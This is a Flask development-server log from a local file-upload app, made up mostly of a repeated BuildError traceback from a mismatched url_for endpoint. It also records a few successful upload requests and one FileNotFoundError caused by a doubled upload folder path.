werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:15:49,524 - 127.0.0.1 - - [22/Feb/2025 18:15:49] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:21:54,851 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:21:54,851 - [33mPress CTRL+C to quit[0m
2025-02-22 18:21:57,696 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:21:57,699 - 127.0.0.1 - - [22/Feb/2025 18:21:57] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:21:58,346 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:21:58,347 - 127.0.0.1 - - [22/Feb/2025 18:21:58] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:21:58,511 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:21:58,512 - 127.0.0.1 - - [22/Feb/2025 18:21:58] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:21:58,698 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:21:58,699 - 127.0.0.1 - - [22/Feb/2025 18:21:58] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:21:58,878 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:21:58,878 - 127.0.0.1 - - [22/Feb/2025 18:21:58] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:22:06,107 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:22:06,109 - 127.0.0.1 - - [22/Feb/2025 18:22:06] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:22:06,287 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:22:06,287 - 127.0.0.1 - - [22/Feb/2025 18:22:06] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:22:06,459 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:22:06,460 - 127.0.0.1 - - [22/Feb/2025 18:22:06] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:22:06,598 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:22:06,599 - 127.0.0.1 - - [22/Feb/2025 18:22:06] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:22:06,778 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:22:06,779 - 127.0.0.1 - - [22/Feb/2025 18:22:06] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:23:10,742 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:23:10,742 - [33mPress CTRL+C to quit[0m
2025-02-22 18:23:13,689 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 90, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 18:23:13,693 - 127.0.0.1 - - [22/Feb/2025 18:23:13] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:23:18,788 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:23:18,788 - [33mPress CTRL+C to quit[0m
2025-02-22 18:23:20,654 - 127.0.0.1 - - [22/Feb/2025 18:23:20] "GET / HTTP/1.1" 200 -
2025-02-22 18:28:32,340 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:28:32,341 - [33mPress CTRL+C to quit[0m
2025-02-22 18:28:36,402 - 127.0.0.1 - - [22/Feb/2025 18:28:36] "GET / HTTP/1.1" 200 -
2025-02-22 18:28:44,763 - 127.0.0.1 - - [22/Feb/2025 18:28:44] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:28:44,767 - 127.0.0.1 - - [22/Feb/2025 18:28:44] "GET / HTTP/1.1" 200 -
2025-02-22 18:28:57,599 - 127.0.0.1 - - [22/Feb/2025 18:28:57] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:28:57,602 - 127.0.0.1 - - [22/Feb/2025 18:28:57] "GET / HTTP/1.1" 200 -
2025-02-22 18:29:07,305 - Exception on /upload-folder [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 168, in upload_folder
    file.save(filepath)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/datastructures/file_storage.py", line 125, in save
    dst = open(dst, "wb")
FileNotFoundError: [Errno 2] No such file or directory: 'uploads/new_test/new_test/HELLO.txt'
2025-02-22 18:29:07,307 - 127.0.0.1 - - [22/Feb/2025 18:29:07] "[35m[1mPOST /upload-folder HTTP/1.1[0m" 500 -
2025-02-22 18:29:08,554 - 127.0.0.1 - - [22/Feb/2025 18:29:08] "GET / HTTP/1.1" 200 -
2025-02-22 18:32:53,071 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:32:53,071 - [33mPress CTRL+C to quit[0m
2025-02-22 18:32:56,517 - 127.0.0.1 - - [22/Feb/2025 18:32:56] "GET / HTTP/1.1" 200 -
2025-02-22 18:33:03,650 - 127.0.0.1 - - [22/Feb/2025 18:33:03] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:33:03,656 - 127.0.0.1 - - [22/Feb/2025 18:33:03] "GET / HTTP/1.1" 200 -
2025-02-22 18:33:10,470 - 127.0.0.1 - - [22/Feb/2025 18:33:10] "[32mPOST /upload HTTP/1.1[0m" 302 -
